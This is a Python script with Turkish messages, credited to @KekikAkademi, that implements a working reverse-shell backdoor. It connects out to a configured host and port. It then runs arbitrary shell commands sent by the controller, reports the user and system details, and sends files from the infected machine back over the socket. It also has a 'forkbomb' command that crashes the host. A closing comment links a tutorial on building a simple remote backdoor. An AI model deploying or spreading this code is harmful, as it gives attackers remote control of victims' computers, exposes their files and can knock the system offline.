#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init(autoreset=True)

RHOST = "127.0.0.1"
RPORT = 2222

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        header = f"{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}$ "
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # List files in the dir
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        # Forkbomb
        if cmd == "forkbomb":
            while True:
                os.fork()

        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Dizini olarak değiştirildi {}".format(os.getcwd()).encode())

        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
    İşletim Sistemi: {platform.system()}
    Bilgisayar Adı: {platform.node()}
    Kullanıcı Adı: {getpass.getuser()}
    Bellenim Sürümü: {platform.release()}
    İşlemci Mimarisi: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Gönderiliyor:", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print("Veri gönderme işlemi tamamlandı")

        # Terminate the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # Run any other command
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # If the connection terminates
        if not cmd:
            print("Bağlantı kesildi")
            break
    except Exception as e:
        sock.send("Bir hata oluştu: {}".format(str(e)).encode())
sock.close()

#https://dev.to/tman540/simple-remote-backdoor-with-python-33a0